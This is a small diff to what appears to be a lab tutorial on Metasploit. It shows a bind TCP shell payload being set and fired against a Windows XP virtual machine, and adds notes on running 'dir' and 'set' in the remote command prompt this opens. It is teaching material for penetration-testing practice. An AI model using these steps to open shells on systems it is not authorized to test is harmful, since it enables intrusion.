@@ -58,3 +58,7 @@ set windows/shell/bind_tcp
 ```
 exploit
 ```
+
+> If the exploit is successful, a remote connection will be established to the command prompt of the Windows XP VM
+> - Run `dir` to list all files on the remote target
+> - Type `set` to see list of current environment variables
